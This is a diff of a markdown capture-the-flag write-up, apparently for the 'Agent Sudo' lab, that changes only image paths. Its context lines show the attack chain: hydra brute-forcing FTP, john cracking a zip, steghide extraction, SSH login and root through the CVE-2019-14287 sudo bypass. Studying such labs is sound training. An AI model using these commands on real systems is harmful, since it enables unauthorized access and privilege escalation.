@@ -71,12 +71,12 @@ Nothing much
 
 ### surf the web
 
-![robots](/assets/images/Agent_sudo/Pasted%20image%2020241016101306.png)
+![robots](/assets/img/Agent_sudo/Pasted%20image%2020241016101306.png)
 
 Let's try spoofing as C and get the same URL with curl.  
 -A allows us to spoof the user agent and -L follows any redirects.
 
-![robots](/assets/images/Agent_sudo/Pasted%20image%2020241016101415.png)
+![robots](/assets/img/Agent_sudo/Pasted%20image%2020241016101415.png)
 
 Now we have a user `chris` but not sure it's for ssh or ftp.
 
@@ -88,7 +88,7 @@ hydra -L users.txt -P passwords.txt <IP> ftp
 # hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.55.182 ftp
 ```
 
-![robots](/assets/images/Agent_sudo/Pasted%20image%2020241016101444.png)
+![robots](/assets/img/Agent_sudo/Pasted%20image%2020241016101444.png)
 
 ## Result
 ftp details  
@@ -99,11 +99,11 @@ log in!!!
 ftp chris@10.10.55.182 
 ```
 
-![robots](/assets/images/Agent_sudo/Pasted%20image%2020241016101527.png)
+![robots](/assets/img/Agent_sudo/Pasted%20image%2020241016101527.png)
 
 
 we got the file, concatenate it:  
-![robots](/assets/images/Agent_sudo/Pasted%20image%2020241016101543.png)
+![robots](/assets/img/Agent_sudo/Pasted%20image%2020241016101543.png)
 
 
 Will have to go back and get the images. We run binwalk on the png file which is the most likely to contain some hidden files.
@@ -122,7 +122,7 @@ zip2john 8702.zip > forjohn
 john forjohn.txt
 ```
 
-![robots](/assets/images/Agent_sudo/Pasted%20image%2020241016101614.png)
+![robots](/assets/img/Agent_sudo/Pasted%20image%2020241016101614.png)
 
 Password = alien  
 Unzip the files. 
@@ -141,7 +141,7 @@ steghide extract -sf cute-alien.jpg
 cat message.txt
 ```
 
-![robots](/assets/images/Agent_sudo/Pasted%20image%2020241023204845.png)
+![robots](/assets/img/Agent_sudo/Pasted%20image%2020241023204845.png)
 
 
 ### Details
@@ -155,11 +155,11 @@ Details
  ssh james@10.10.55.182 
 # password = hackerrules!
 ```
-![robots](/assets/images/Agent_sudo/Pasted%20image%2020241016101901.png)
+![robots](/assets/img/Agent_sudo/Pasted%20image%2020241016101901.png)
 
 # Privilege escalation
 Run sudo -l  
-![robots](/assets/images/Agent_sudo/Pasted%20image%2020241016101951.png)
+![robots](/assets/img/Agent_sudo/Pasted%20image%2020241016101951.png)
 
 Google search for the exploit: CVE:2019-14287  
 In the exploit page, we get:  
@@ -167,4 +167,4 @@ In the exploit page, we get:
  'sudo -u #-1 /bin/bash'
  #Read the root flag. 
 ```
-![robots](/assets/images/Agent_sudo/Pasted%20image%2020241016102023.png)
+![robots](/assets/img/Agent_sudo/Pasted%20image%2020241016102023.png)
